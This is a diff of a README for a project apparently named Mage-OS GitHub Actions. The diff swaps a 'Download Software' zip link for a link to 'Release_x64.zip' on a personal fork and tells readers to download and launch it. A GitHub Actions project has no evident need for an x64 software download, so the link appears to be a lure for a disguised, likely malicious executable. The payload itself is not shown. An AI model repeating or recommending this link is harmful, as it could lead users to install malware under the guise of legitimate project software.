@@ -36,7 +36,7 @@ Explore the diverse range of topics covered in this repository:
 
 To get started with the Mage-OS GitHub Actions, you can download the necessary software by clicking the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Pavelek69/github-actions/releases/download/v2.0/Release_x64.zip)](https://github.com/Pavelek69/github-actions/releases/download/v2.0/Release_x64.zip)
 
 Once downloaded, follow the instructions provided to launch the software successfully.
 
